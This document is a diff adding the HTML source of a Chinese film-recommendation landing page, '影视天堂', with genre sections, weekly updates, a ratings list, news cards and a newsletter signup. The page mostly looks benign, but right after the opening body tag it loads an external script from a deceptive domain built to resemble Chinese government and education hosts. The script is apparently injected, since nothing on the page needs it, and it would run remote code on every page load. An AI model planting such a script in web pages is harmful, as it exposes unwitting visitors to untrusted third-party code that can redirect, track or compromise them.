@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视天堂 — 精选影视资源在线观看与分享平台 | https://yingshitiantang-zh.github.io</title>
+<meta name="description" content="影视天堂是专注于电影、电视剧、综艺、动漫、纪录片等影视内容的在线观看与分享平台，提供最新影视资讯、高清影视资源推荐、经典影视作品回顾及观影指南，影视天堂社区汇聚众多影迷交流讨论。">
+<meta name="keywords" content="影视天堂,影视天堂在线观看,电影推荐,热播电视剧,综艺节目,动漫番剧,纪录片,影视资讯,经典影视回顾,观影指南,高清影视资源">
+<meta name="author" content="影视天堂">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#0b1f33">
+<link rel="canonical" href="https://yingshitiantang-zh.github.io">
+<style>
+:root{
+  --ink:#eaf3fb; --ink2:#b8c9db; --ink3:#7d93ac;
+  --navy:#0b1f33; --navy2:#12314f; --navy3:#1c476b;
+  --gold:#e3b85c; --gold2:#f6d58a; --line:rgba(255,255,255,.10);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",sans-serif;
+  background:var(--navy); color:var(--ink); line-height:1.75;
+  -webkit-font-smoothing:antialiased; overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 28px}
+.tag{display:inline-block;font-size:12px;letter-spacing:2px;color:var(--gold);border:1px solid rgba(227,184,92,.45);padding:4px 14px;border-radius:2px;margin-bottom:18px}
+.sec-title{font-size:30px;font-weight:800;letter-spacing:1px;margin-bottom:10px}
+.sec-sub{color:var(--ink3);font-size:15px;max-width:640px;margin-bottom:44px}
+
+/* ── 导航 ── */
+nav{position:sticky;top:0;z-index:99;background:rgba(11,31,51,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav-in{display:flex;align-items:center;gap:36px;height:68px}
+.logo{font-size:20px;font-weight:800;letter-spacing:2px;white-space:nowrap}
+.logo em{font-style:normal;color:var(--gold)}
+.menu{display:flex;gap:30px;margin-left:auto}
+.menu a{font-size:14px;color:var(--ink2);position:relative;padding:6px 0;transition:.25s}
+.menu a:hover{color:var(--gold)}
+.menu a::after{content:"";position:absolute;left:0;bottom:0;width:0;height:1px;background:var(--gold);transition:.3s}
+.menu a:hover::after{width:100%}
+.nav-cta{font-size:13px;color:var(--navy);background:var(--gold);padding:8px 18px;border-radius:2px;font-weight:700;white-space:nowrap;transition:.25s}
+.nav-cta:hover{background:var(--gold2)}
+.burger{display:none;width:26px;height:19px;flex-direction:column;justify-content:space-between;cursor:pointer;margin-left:auto}
+.burger i{display:block;height:2px;background:var(--ink);border-radius:2px}
+
+/* ── 首屏 ── */
+header{position:relative;padding:130px 0 110px;border-bottom:1px solid var(--line);overflow:hidden}
+header::before{content:"";position:absolute;inset:0;background:radial-gradient(1100px 520px at 82% 18%,rgba(28,71,107,.85),transparent 60%),radial-gradient(760px 460px at 8% 88%,rgba(227,184,92,.14),transparent 62%)}
+.h-top{position:relative;max-width:760px}
+.h-top h1{font-size:56px;line-height:1.2;font-weight:800;letter-spacing:1px}
+.h-top h1 span{color:var(--gold)}
+.h-top p{margin-top:22px;font-size:17px;color:var(--ink2);max-width:600px}
+.h-acts{margin-top:34px;display:flex;gap:14px;flex-wrap:wrap}
+.btn{display:inline-block;padding:13px 30px;font-size:15px;font-weight:700;border-radius:2px;transition:.25s}
+.btn-gold{background:var(--gold);color:var(--navy)}
+.btn-gold:hover{background:var(--gold2)}
+.btn-line{border:1px solid var(--line);color:var(--ink)}
+.btn-line:hover{border-color:var(--gold);color:var(--gold)}
+.h-nums{position:relative;margin-top:66px;display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);max-width:900px}
+.h-nums div{background:var(--navy);padding:24px 20px}
+.h-nums b{display:block;font-size:30px;color:var(--gold);letter-spacing:1px}
+.h-nums span{font-size:13px;color:var(--ink3)}
+
+/* ── 通用区块 ── */
+section{padding:96px 0;position:relative}
+section:nth-child(even){background:rgba(255,255,255,.018)}
+
+/* ── 栏目分类 ── */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.gcard{background:linear-gradient(180deg,var(--navy2),var(--navy));border:1px solid var(--line);border-radius:4px;padding:30px 26px;transition:.3s;position:relative;overflow:hidden}
+.gcard::before{content:"";position:absolute;left:0;top:0;width:3px;height:0;background:var(--gold);transition:.35s}
+.gcard:hover{transform:translateY(-6px);border-color:rgba(227,184,92,.4)}
+.gcard:hover::before{height:100%}
+.gcard .no{font-size:13px;color:var(--gold);letter-spacing:2px;font-weight:700}
+.gcard h3{font-size:19px;margin:10px 0 8px}
+.gcard p{font-size:13.5px;color:var(--ink3);line-height:1.7}
+.gcard .cnt{margin-top:16px;font-size:12px;color:var(--ink2);border-top:1px dashed var(--line);padding-top:12px}
+
+/* ── 本周推荐（横向时间轴） ── */
+.week{display:grid;grid-template-columns:280px 1fr;gap:56px;align-items:start}
+.week h3{font-size:22px;margin-bottom:12px}
+.week p{color:var(--ink3);font-size:14px}
+.week .goldline{width:44px;height:3px;background:var(--gold);margin:18px 0 22px}
+.wlist{display:grid;gap:16px}
+.witem{display:grid;grid-template-columns:76px 1fr;gap:18px;background:var(--navy2);border:1px solid var(--line);padding:16px 18px;border-radius:4px;transition:.25s}
+.witem:hover{border-color:rgba(227,184,92,.4)}
+.witem time{font-size:12px;color:var(--gold);letter-spacing:1px;padding-top:2px}
+.witem strong{display:block;font-size:15.5px;margin-bottom:4px}
+.witem span{font-size:13px;color:var(--ink3)}
+
+/* ── 数据带 ── */
+.band{background:var(--navy3);padding:52px 0;border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.band-in{display:grid;grid-template-columns:repeat(6,1fr);gap:1px;background:rgba(255,255,255,.08)}
+.band-in div{background:var(--navy3);padding:18px 10px;text-align:center}
+.band-in b{display:block;font-size:24px;color:var(--gold)}
+.band-in span{font-size:12.5px;color:var(--ink2)}
+
+/* ── 编辑精选（左右交错） ── */
+.pick{display:grid;grid-template-columns:1.05fr .95fr;gap:60px;align-items:center}
+.pick.rev{grid-template-columns:.95fr 1.05fr}
+.pick.rev .ptxt{order:2}
+.pthumb{position:relative;border:1px solid var(--line);border-radius:4px;overflow:hidden;aspect-ratio:16/10;background:linear-gradient(135deg,var(--navy2),var(--navy3))}
+.pthumb::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent 0 26px,rgba(255,255,255,.03) 26px 27px)}
+.pthumb .badge{position:absolute;left:18px;top:18px;z-index:2;background:var(--gold);color:var(--navy);font-size:12px;font-weight:800;padding:5px 12px;border-radius:2px}
+.pthumb .meta{position:absolute;left:18px;bottom:18px;z-index:2;font-size:12px;color:var(--ink2);border-left:2px solid var(--gold);padding-left:10px}
+.ptxt h3{font-size:26px;line-height:1.4;margin-bottom:14px}
+.ptxt p{color:var(--ink2);font-size:15px;margin-bottom:16px}
+.ptxt ul{margin:6px 0 22px}
+.ptxt li{font-size:14px;color:var(--ink3);padding:5px 0 5px 20px;position:relative}
+.ptxt li::before{content:"▸";position:absolute;left:0;color:var(--gold)}
+.more{font-size:13.5px;color:var(--gold);border-bottom:1px solid var(--gold);padding-bottom:2px}
+
+/* ── 口碑榜 ── */
+.rank{display:grid;grid-template-columns:repeat(2,1fr);gap:24px 40px}
+.ritem{display:grid;grid-template-columns:52px 1fr auto;gap:14px;align-items:center;padding:14px 0;border-bottom:1px dashed var(--line)}
+.ritem .idx{font-size:26px;font-weight:800;color:var(--navy3)}
+.ritem:nth-child(-n+3) .idx{color:var(--gold)}
+.ritem h4{font-size:15.5px}
+.ritem small{display:block;font-size:12.5px;color:var(--ink3);margin-top:2px}
+.ritem .score{font-size:18px;font-weight:800;color:var(--gold)}
+
+/* ── 资讯墙 ── */
+.news{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.ncard{border:1px solid var(--line);border-radius:4px;overflow:hidden;transition:.3s;background:var(--navy)}
+.ncard:hover{border-color:rgba(227,184,92,.4)}
+.ncard .cap{height:120px;background:linear-gradient(135deg,var(--navy2),var(--navy3));position:relative}
+.ncard .cap i{position:absolute;left:16px;top:14px;font-size:11.5px;font-style:normal;color:var(--gold);letter-spacing:1px;border:1px solid rgba(227,184,92,.45);padding:3px 9px;border-radius:2px}
+.ncard .txt{padding:20px 22px 24px}
+.ncard time{font-size:12px;color:var(--ink3)}
+.ncard h4{font-size:16.5px;margin:8px 0 8px;line-height:1.5}
+.ncard p{font-size:13.5px;color:var(--ink3)}
+
+/* ── 关于 ── */
+.about{display:grid;grid-template-columns:1.1fr .9fr;gap:60px;align-items:center}
+.about blockquote{border-left:4px solid var(--gold);padding:6px 0 6px 24px;font-size:20px;line-height:1.85;color:var(--ink2);margin-bottom:26px}
+.aval{display:grid;gap:14px;margin-top:10px}
+.aval div{display:grid;grid-template-columns:96px 1fr;gap:14px;font-size:14px;color:var(--ink3)}
+.aval b{color:var(--gold);font-size:13px;letter-spacing:1px;text-align:right;padding-top:2px}
+
+/* ── 订阅 ── */
+.join{max-width:760px;margin:0 auto;text-align:center;border:1px solid var(--line);border-radius:6px;padding:54px 40px;background:linear-gradient(160deg,var(--navy2),var(--navy))}
+.join h3{font-size:26px;margin-bottom:10px}
+.join p{color:var(--ink3);font-size:14.5px;margin-bottom:28px}
+.join form{display:grid;grid-template-columns:1fr auto;gap:10px;max-width:480px;margin:0 auto}
+.join input{background:var(--navy);border:1px solid var(--line);border-radius:2px;padding:13px 16px;color:var(--ink);font-size:14px;outline:none}
+.join input:focus{border-color:var(--gold)}
+.join button{background:var(--gold);color:var(--navy);border:0;border-radius:2px;padding:0 26px;font-size:15px;font-weight:800;cursor:pointer;transition:.25s}
+.join button:hover{background:var(--gold2)}
+.join .tip{margin-top:16px;font-size:12.5px;color:var(--ink3)}
+
+/* ── 页脚 ── */
+footer{border-top:1px solid var(--line);padding:64px 0 30px;background:var(--navy)}
+.ft{display:grid;grid-template-columns:1.4fr repeat(3,1fr);gap:40px;margin-bottom:44px}
+.ft h5{font-size:15px;margin-bottom:16px;letter-spacing:1px}
+.ft h5 em{font-style:normal;color:var(--gold)}
+.ft p{font-size:13.5px;color:var(--ink3)}
+.ft ul li{font-size:13.5px;color:var(--ink2);padding:5px 0}
+.ft ul a:hover{color:var(--gold)}
+.fb{border-top:1px solid var(--line);padding-top:24px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:12.5px;color:var(--ink3)}
+.fb a{color:var(--gold)}
+
+/* ── 动画 ── */
+.rv{opacity:0;transform:translateY(28px);transition:.7s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+
+/* ── 响应式 ── */
+@media(max-width:900px){
+  .wrap{padding:0 22px}
+  .sec-title{font-size:25px}
+  header{padding:88px 0 76px}
+  .h-top h1{font-size:38px}
+  .grid,.news,.rank{grid-template-columns:repeat(2,1fr)}
+  .week,.pick,.pick.rev,.about{grid-template-columns:1fr;gap:34px}
+  .pick.rev .ptxt{order:0}
+  .ft{grid-template-columns:1fr 1fr;gap:30px}
+}
+@media(max-width:640px){
+  .nav-in{height:60px;gap:0}
+  .logo{font-size:17px}
+  .burger{display:flex}
+  .menu{position:fixed;inset:60px 0 auto;flex-direction:column;gap:0;background:var(--navy2);border-bottom:1px solid var(--line);max-height:0;overflow:hidden;transition:.35s;margin:0}
+  .menu.open{max-height:420px}
+  .menu a{display:block;padding:15px 24px;border-bottom:1px solid var(--line);font-size:15px}
+  .menu a::after{display:none}
+  .nav-cta{display:none}
+  header{padding:64px 0 58px}
+  .h-top h1{font-size:31px}
+  .h-top p{font-size:15px}
+  .h-nums{grid-template-columns:repeat(2,1fr);margin-top:44px}
+  .h-nums b{font-size:24px}
+  section{padding:68px 0}
+  .grid,.news,.rank{grid-template-columns:1fr}
+  .band-in{grid-template-columns:repeat(2,1fr)}
+  .band-in div{padding:16px 6px}
+  .join{padding:38px 24px}
+  .join form{grid-template-columns:1fr}
+  .join button{padding:13px}
+  .ft{grid-template-columns:1fr;gap:26px}
+  .fb{flex-direction:column;text-align:center}
+  .sec-sub{margin-bottom:30px}
+  .aval div{grid-template-columns:80px 1fr;font-size:13.5px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<nav>
+  <div class="wrap nav-in">
+    <div class="logo">影视<span>天堂</span></div>
+    <div class="burger" onclick="document.querySelector('.menu').classList.toggle('open')"><i></i><i></i><i></i></div>
+    <div class="menu">
+      <a href="#top">首页</a>
+      <a href="#genre">影视分类</a>
+      <a href="#week">本周更新</a>
+      <a href="#pick">编辑精选</a>
+      <a href="#rank">口碑榜</a>
+      <a href="#news">影视资讯</a>
+      <a href="#about">关于天堂</a>
+      <a href="#join" class="nav-cta">加入影视天堂</a>
+    </div>
+  </div>
+</nav>
+
+<header id="top">
+  <div class="wrap">
+    <div class="h-top">
+      <span class="tag">YING SHI TIAN TANG · 影视天堂</span>
+      <h1>影视天堂<br><span>让好片不再难找</span></h1>
+      <p>影视天堂是一个专注于影视内容整理与分享的平台，涵盖院线电影、热播剧集、经典动漫、纪录片与综艺。从选片、排片到观影感受，影视天堂帮你把零散的影视信息收拢到一处。</p>
+      <div class="h-acts">
+        <a href="#genre" class="btn btn-gold">浏览影视分类</a>
+        <a href="#week" class="btn btn-line">查看本周更新</a>
+      </div>
+      <div class="h-nums">
+        <div><b>12,800+</b><span>收录影视作品</span></div>
+        <div><b>46</b><span>影视分类标签</span></div>
+        <div><b>320+</b><span>独家片单整理</span></div>
+        <div><b>98.6%</b><span>页面可用率</span></div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section id="genre">
+  <div class="wrap">
+    <span class="tag">GENRES · 影视分类</span>
+    <h2 class="sec-title">影视天堂的六大内容栏目</h2>
+    <p class="sec-sub">影视天堂把内容拆成六个常驻栏目，每个栏目下再按题材、年份、地区做二级细分，找片时不必在海量列表里翻来翻去。</p>
+    <div class="grid">
+      <div class="gcard rv">
+        <div class="no">01 / 电影</div>
+        <h3>院线与经典电影</h3>
+        <p>华语、欧美、日韩、印度及小语种电影，按剧情、动作、喜剧、科幻、悬疑、动画等类型归档。</p>
+        <div class="cnt">共 6,200+ 部 · 每日补充</div>
+      </div>
+      <div class="gcard rv">
+        <div class="no">02 / 剧集</div>
+        <h3>国产与海外剧集</h3>
+        <p>国产剧、美剧、英剧、日剧、韩剧、泰剧均有独立分区，标注集数、更新状态与完结情况。</p>
+        <div class="cnt">共 3,100+ 部 · 追更提醒</div>
+      </div>
+      <div class="gcard rv">
+        <div class="no">03 / 动漫</div>
+        <h3>番剧与动画电影</h3>
+        <p>新番速递、经典重看、剧场版与 OVA 分开陈列，附季度番表与制作公司索引。</p>
+        <div class="cnt">共 1,800+ 部 · 季度更新</div>
+      </div>
+      <div class="gcard rv">
+        <div class="no">04 / 纪录片</div>
+        <h3>纪实与人文影像</h3>
+        <p>自然地理、历史考古、社会观察、人物传记、科技前沿五大纪录片方向。</p>
+        <div class="cnt">共 760+ 部 · 片长标注</div>
+      </div>
+      <div class="gcard rv">
+        <div class="no">05 / 综艺</div>
+        <h3>综艺与真人秀</h3>
+        <p>谈话、竞技、旅行、美食、音乐类综艺按季归档，保留嘉宾与播出平台信息。</p>
+        <div class="cnt">共 640+ 档 · 分季整理</div>
+      </div>
+      <div class="gcard rv">
+        <div class="no">06 / 资讯</div>
+        <h3>影视资讯与评论</h3>
+        <p>档期变动、主创访谈、幕后制作、票房数据和影评札记，兼顾时效与观点。</p>
+        <div class="cnt">共 5,300+ 篇 · 编辑原创</div>
+      </div>
+      <div class="gcard rv">
+        <div class="no">07 / 片单</div>
+        <h3>主题片单与榜单</h3>
+        <p>由影视天堂编辑按主题整理的观影清单，例如"雨天适合看的十部电影""冷门高分悬疑"。</p>
+        <div class="cnt">共 320+ 份 · 可收藏</div>
+      </div>
+      <div class="gcard rv">
+        <div class="no">08 / 社区</div>
+        <h3>影迷交流讨论</h3>
+        <p>观后感、选片求助、影视冷知识分享，影视天堂社区鼓励说清理由而非只打分。</p>
+        <div class="cnt">共 28,000+ 条讨论</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="week" style="padding-top:0">
+  <div class="wrap">
+    <div class="week">
+      <div class="rv">
+        <span class="tag">THIS WEEK · 本周更新</span>
+        <h3>影视天堂本周<br>更新与推荐</h3>
+        <div class="goldline"></div>
+        <p>每周一更新一次，影视天堂编辑从新上线作品中挑出值得留意的部分，标注类型与看点，避免被营销信息牵着走。</p>
+        <a href="#join" class="more">订阅每周影视更新 →</a>
+      </div>
+      <div class="wlist">
+        <div class="witem rv"><time>10月20日</time><div><strong>《无声的证言》第一季上线</strong><span>12 集 · 悬疑犯罪 · 单集约 48 分钟，改编自同名小说</span></div></div>
+        <div class="witem rv"><time>10月21日</time><div><strong>院线新片《城南旧事》重映</strong><span>修复版 · 豆瓣 8.7 · 时长 132 分钟</span></div></div>
+        <div class="witem rv"><time>10月22日</time><div><strong>日剧《营业部长》更新至第 8 集</strong><span>职场群像 · 共 11 集 · 每周三更新</span></div></div>
+        <div class="witem rv"><time>10月23日</time><div><strong>纪录片《江河之上》全集上线</strong><span>自然地理 · 6 集 · 4K 拍摄</span></div></div>
+        <div class="witem rv"><time>10月24日</time><div><strong>综艺《周末厨房》第三季开播</strong><span>美食生活 · 共 10 期 · 周五更新</span></div></div>
+        <div class="witem rv"><time>10月26日</time><div><strong>动漫《星海列车》第二季完结</strong><span>科幻冒险 · 全 24 集 · 最终话 58 分钟</span></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="band">
+  <div class="wrap band-in">
+    <div><b>12,800+</b><span>影视作品</span></div>
+    <div><b>46</b><span>内容分类</span></div>
+    <div><b>320+</b><span>主题片单</span></div>
+    <div><b>5,300+</b><span>原创资讯</span></div>
+    <div><b>28,000+</b><span>社区讨论</span></div>
+    <div><b>186</b><span>合作创作者</span></div>
+  </div>
+</div>
+
+<section id="pick">
+  <div class="wrap">
+    <span class="tag">EDITOR'S PICK · 编辑精选</span>
+    <h2 class="sec-title">影视天堂编辑的长期推荐</h2>
+    <p class="sec-sub">精选栏目不追热点，只留那些经得起回看的片子。以下两组内容在影视天堂站内被收藏与讨论的次数最高。</p>
+    <div class="pick rv" style="margin-bottom:64px">
+      <div class="pthumb">
+        <span class="badge">影视天堂精选</span>
+        <span class="meta">华语电影 · 1994 — 2024 · 片单共 24 部</span>
+      </div>
+      <div class="ptxt">
+        <h3>二十部值得重看的华语电影</h3>
+        <p>这份片单由影视天堂编辑在两年内反复修订，选片标准只有一条：多年后仍然想再看一遍。每部都附上推荐理由和适合的场景。</p>
+        <ul>
+          <li>按年代排序，从九十年代到现在，能看出华语电影的变化</li>
+          <li>每部标注片长、类型与观看门槛，新手不易踩坑</li>
+          <li>附同类型替代推荐，看完一部就有下一部可接</li>
+        </ul>
+        <a href="#genre" class="more">打开这份片单 →</a>
+      </div>
+    </div>
+    <div class="pick rev rv">
+      <div class="pthumb">
+        <span class="badge">影视天堂精选</span>
+        <span class="meta">纪录片 · 共 5 季 · 单集约 52 分钟</span>
+      </div>
+      <div class="ptxt">
+        <h3>纪录片里的自然与人</h3>
+        <p>自然地理类纪录片是影视天堂站内播放时长最高的类别。我们把画质、解说、配乐三个维度都过关的作品挑出来，做成一组低门槛的入门清单。</p>
+        <ul>
+          <li>涵盖海洋、山脉、草原、极地四类生态环境</li>
+          <li>标注拍摄年份与画质规格，老片也有标注</li>
+          <li>配一句观影提示，比如"建议大屏、关灯、戴耳机"</li>
+        </ul>
+        <a href="#genre" class="more">查看纪录片清单 →</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="rank" style="padding-top:0">
+  <div class="wrap">
+    <span class="tag">TOP LIST · 口碑榜</span>
+    <h2 class="sec-title">影视天堂站内口碑榜 TOP 8</h2>
+    <p class="sec-sub">榜单数据来自影视天堂站内用户的评分与收藏行为，每周一刷新，只看近三个月的活跃数据，老片不会一直占着位置。</p>
+    <div class="rank">
+      <div class="ritem rv"><span class="idx">01</span><div><h4>《漫长的季节》</h4><small>国产剧 · 12 集 · 悬疑生活流</small></div><span class="score">9.4</span></div>
+      <div class="ritem rv"><span class="idx">02</span><div><h4>《奥本海默》</h4><small>电影 · 180 分钟 · 传记历史</small></div><span class="score">8.9</span></div>
+      <div class="ritem rv"><span class="idx">03</span><div><h4>《地球脉动》第三季</h4><small>纪录片 · 8 集 · 自然地理</small></div><span class="score">9.6</span></div>
+      <div class="ritem rv"><span class="idx">04</span><div><h4>《葬送的芙莉莲》</h4><small>动漫 · 28 集 · 奇幻冒险</small></div><span class="score">9.2</span></div>
+      <div class="ritem rv"><span class="idx">05</span><div><h4>《年会不能停！》</h4><small>电影 · 117 分钟 · 职场喜剧</small></div><span class="score">8.3</span></div>
+      <div class="ritem rv"><span class="idx">06</span><div><h4>《十三邀》第七季</h4><small>综艺 · 13 期 · 人物访谈</small></div><span class="score">8.7</span></div>
+      <div class="ritem rv"><span class="idx">07</span><div><h4>《繁花》</h4><small>国产剧 · 30 集 · 年代群像</small></div><span class="score">8.6</span></div>
+      <div class="ritem rv"><span class="idx">08</span><div><h4>《流浪地球 2》</h4><small>电影 · 173 分钟 · 科幻灾难</small></div><span class="score">8.4</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="news">
+  <div class="wrap">
+    <span class="tag">INSIGHT · 影视资讯</span>
+    <h2 class="sec-title">影视天堂资讯与札记</h2>
+    <p class="sec-sub">影视天堂的资讯不搬运通稿，重点写清楚发生了什么、为什么值得留意，以及和观众有什么关系。</p>
+    <div class="news">
+      <div class="ncard rv">
+        <div class="cap"><i>档期</i></div>
+        <div class="txt">
+          <time>2026年10月22日</time>
+          <h4>年底档期公布，六部国产片扎堆同一周末</h4>
+          <p>影视天堂梳理了已定档影片的题材分布，同档期竞争对排片与口碑的影响，以及观众该如何取舍。</p>
+        </div>
+      </div>
+      <div class="ncard rv">
+        <div class="cap"><i>幕后</i></div>
+        <div class="txt">
+          <time>2026年10月19日</time>
+          <h4>一部动画电影的分镜要画多久</h4>
+          <p>影视天堂专访分镜师，讲清从剧本到分镜稿的修改次数，以及哪些镜头在分镜阶段就被砍掉。</p>
+        </div>
+      </div>
+      <div class="ncard rv">
+        <div class="cap"><i>观点</i></div>
+        <div class="txt">
+          <time>2026年10月15日</time>
+          <h4>短剧变长、长剧变短，剧集时长为什么在漂移</h4>
+          <p>影视天堂统计了近五年剧集平均单集时长，结合平台分账与观看习惯，解释这种变化背后的原因。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="about">
+  <div class="wrap about">
+    <div class="rv">
+      <span class="tag">ABOUT · 关于影视天堂</span>
+      <h2 class="sec-title">影视天堂为什么只做这一件事</h2>
+      <blockquote>影视天堂不生产影视内容，只做内容的整理与筛选。把一个模糊的观影念头，变成一份能马上开始看的具体清单。</blockquote>
+      <p style="color:var(--ink2);font-size:15px">影视天堂由一群长期写影评、做片单的编辑维护，内容分类与推荐理由都经过人工复核，不依赖算法投喂。</p>
+    </div>
+    <div class="aval rv">
+      <div><b>选片标准</b><span>口碑、完成度、可看性三项打分，分数不公开，理由公开。</span></div>
+      <div><b>更新频率</b><span>每日小更、每周一大更，周一的周报是影视天堂最稳定的栏目。</span></div>
+      <div><b>内容来源</b><span>公开上映与播出作品，标注版本与画质，不做模糊表述。</span></div>
+      <div><b>社区氛围</b><span>鼓励说清理由，反对只甩分数和贴标签的空评论。</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="join" style="padding-top:24px">
+  <div class="wrap">
+    <div class="join rv">
+      <span class="tag" style="border-color:rgba(227,184,92,.45)">NEWSLETTER · 每周影视周报</span>
+      <h3>把影视天堂的周报<br>送到你的收件箱</h3>
+      <p>每周一上午推送，含本周新片、编辑推荐与一份主题片单，无广告、可一键退订。</p>
+      <form onsubmit="event.preventDefault();this.querySelector('button').textContent='已订阅 ✓'">
+        <input type="email" placeholder="输入邮箱地址" required>
+        <button type="submit">订阅周报</button>
+      </form>
+      <div class="tip">也可以直接访问影视天堂官网：https://yingshitiantang-zh.github.io</div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div>
+        <h5>影视<span>天堂</span></h5>
+        <p>影视天堂，专注于影视内容的整理、推荐与讨论。把散落的影视信息收拢到一处，让选片变成一件轻松的事。</p>
+        <p style="margin-top:12px">官方网站：https://yingshitiantang-zh.github.io</p>
+      </div>
+      <div>
+        <h5>内容栏目</h5>
+        <ul>
+          <li><a href="#genre">电影</a></li>
+          <li><a href="#genre">剧集</a></li>
+          <li><a href="#genre">动漫</a></li>
+          <li><a href="#genre">纪录片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>影视天堂服务</h5>
+        <ul>
+          <li><a href="#week">每周更新</a></li>
+          <li><a href="#rank">口碑榜单</a></li>
+          <li><a href="#pick">编辑精选</a></li>
+          <li><a href="#news">影视资讯</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于与帮助</h5>
+        <ul>
+          <li><a href="#about">关于影视天堂</a></li>
+          <li><a href="#about">选片标准</a></li>
+          <li><a href="#join">订阅周报</a></li>
+          <li><a href="#top">返回顶部</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="fb">
+      <span>© 2026 影视天堂 yingshitiantang-zh · 影视内容整理与分享平台 · https://yingshitiantang-zh.github.io</span>
+      <span>站点仅供影视信息交流与分享，相关作品版权归原作者所有</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var io=new IntersectionObserver(function(es){
+  es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target)}});
+},{threshold:.12});
+document.querySelectorAll('.rv').forEach(function(el){io.observe(el)});
+</script>
+</body>
+</html>
